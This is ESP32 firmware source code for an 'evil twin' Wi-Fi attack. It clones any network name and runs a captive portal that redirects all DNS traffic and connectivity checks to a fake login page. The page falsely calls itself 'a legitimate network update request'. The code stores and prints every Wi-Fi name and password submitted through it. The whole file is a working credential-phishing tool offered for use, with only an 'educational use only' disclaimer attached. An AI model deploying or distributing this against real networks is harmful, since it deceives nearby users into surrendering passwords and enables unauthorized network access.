/*
 * W8 — Evil Portal + Captive
 * Create evil twin AP with captive portal for credential capture
 * 
 * Hardware: ESP32-C6
 * 
 * Features:
 *   - Clone any WiFi SSID
 *   - Captive portal with realistic login page
 *   - Capture WiFi credentials
 *   - Support for multiple portal templates
 * 
 * WARNING: Educational use only. Test on your own lab network.
 * 
 * Author: 5h4d0wn1k
 * License: MIT
 * Date: 2026-08-26
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// Captive portal HTML - WiFi Login
const char portal_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Network - Login Required</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
               background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
               min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 10px; 
                    box-shadow: 0 10px 30px rgba(0,0,0,0.2); max-width: 400px; width: 90%; }
        h1 { color: #333; text-align: center; margin-bottom: 10px; font-size: 24px; }
        .subtitle { color: #666; text-align: center; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #555; font-weight: 500; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ddd;
            border-radius: 5px; font-size: 16px; transition: border-color 0.3s; }
        input:focus { outline: none; border-color: #667eea; }
        button { width: 100%; padding: 14px; background: #667eea; color: white; border: none;
                border-radius: 5px; font-size: 16px; font-weight: 600; cursor: pointer;
                transition: background 0.3s; }
        button:hover { background: #5a6fd6; }
        .footer { text-align: center; margin-top: 20px; color: #999; font-size: 12px; }
        .lock-icon { text-align: center; font-size: 48px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="lock-icon">🔒</div>
        <h1>WiFi Network</h1>
        <p class="subtitle">Please enter your WiFi password to continue</p>
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="ssid">Network Name</label>
                <input type="text" id="ssid" name="ssid" required placeholder="WiFi name">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required placeholder="Enter password">
            </div>
            <button type="submit">Connect</button>
        </form>
        <p class="footer">This is a legitimate network update request.</p>
    </div>
</body>
</html>
)rawliteral";

// Success page
const char success_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
               background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
               min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 10px;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; }
        .checkmark { font-size: 72px; margin-bottom: 20px; }
        h1 { color: #333; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 20px; }
        .note { color: #999; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark">✓</div>
        <h1>Connected!</h1>
        <p>You are now connected to the network.</p>
        <p class="note">You may now close this window.</p>
    </div>
</body>
</html>
)rawliteral";

// Global objects
WebServer server(80);
DNSServer dnsServer;

// Captured credentials
struct Credential {
    char ssid[33];
    char password[65];
    uint32_t timestamp;
};

Credential captured_creds[10];
int cred_count = 0;
bool portal_active = false;

// Function prototypes
void startPortal(const char* ssid);
void handleRoot();
void handleLogin();
void handleSuccess();
void handleNotFound();
void showCredentials();

void setup() {
    Serial.begin(115200);
    Serial.println("\n=== W8 — Evil Portal + Captive ===");
    Serial.println("Create evil twin AP with captive portal");
    Serial.println("WARNING: Educational use only!");
    Serial.println();
    
    Serial.println("Ready. Commands:");
    Serial.println("  start <SSID> - Start evil portal with given SSID");
    Serial.println("  stop         - Stop evil portal");
    Serial.println("  creds        - Show captured credentials");
    Serial.println("  help         - Show commands");
}

void loop() {
    if (portal_active) {
        dnsServer.processNextRequest();
        server.handleClient();
    }
    
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        
        if (cmd.startsWith("start ")) {
            String ssid = cmd.substring(6);
            startPortal(ssid.c_str());
        } else if (cmd == "stop") {
            if (portal_active) {
                server.stop();
                dnsServer.stop();
                WiFi.softAPdisconnect();
                portal_active = false;
                Serial.println("Evil portal stopped.");
            }
        } else if (cmd == "creds") {
            showCredentials();
        } else if (cmd == "help") {
            Serial.println("\n=== Commands ===");
            Serial.println("start <SSID> - Start evil portal");
            Serial.println("stop         - Stop evil portal");
            Serial.println("creds        - Show captured credentials");
            Serial.println("help         - Show commands");
            Serial.println("================\n");
        }
    }
}

void startPortal(const char* ssid) {
    Serial.printf("\nStarting evil portal: %s\n", ssid);
    
    // Set WiFi mode
    WiFi.mode(WIFI_AP_STA);
    
    // Configure AP
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
                     IPAddress(192, 168, 4, 1),
                     IPAddress(255, 255, 255, 0));
    
    // Start AP
    WiFi.softAP(ssid, NULL, 6);
    
    // Start DNS server
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    
    // Setup web server
    server.on("/", handleRoot);
    server.on("/login", HTTP_POST, handleLogin);
    server.on("/generate_204", handleRoot);
    server.on("/hotspot-detect.html", handleRoot);
    server.onNotFound(handleRoot);
    server.begin();
    
    portal_active = true;
    
    Serial.println("Evil portal active!");
    Serial.println("Captive portal running on 192.168.4.1");
    Serial.println("Waiting for victims...\n");
}

void handleRoot() {
    server.send(200, "text/html", portal_html);
}

void handleLogin() {
    String ssid = server.arg("ssid");
    String password = server.arg("password");
    
    // Store credential
    if (cred_count < 10) {
        strncpy(captured_creds[cred_count].ssid, ssid.c_str(), 32);
        strncpy(captured_creds[cred_count].password, password.c_str(), 64);
        captured_creds[cred_count].timestamp = millis();
        cred_count++;
    }
    
    // Log to serial
    Serial.println("\n*** CREDENTIAL CAPTURED ***");
    Serial.printf("SSID: %s\n", ssid.c_str());
    Serial.printf("Password: %s\n", password.c_str());
    Serial.println("**************************\n");
    
    // Show success page
    server.send(200, "text/html", success_html);
}

void handleSuccess() {
    server.send(200, "text/html", success_html);
}

void handleNotFound() {
    server.sendHeader("Location", "http://192.168.4.1", true);
    server.send(302, "text/plain", "");
}

void showCredentials() {
    if (cred_count == 0) {
        Serial.println("No credentials captured yet.");
        return;
    }
    
    Serial.println("\n=== Captured Credentials ===");
    for (int i = 0; i < cred_count; i++) {
        Serial.printf("[%d] SSID: %s\n", i, captured_creds[i].ssid);
        Serial.printf("    Pass: %s\n", captured_creds[i].password);
        Serial.println();
    }
    Serial.println("============================\n");
}
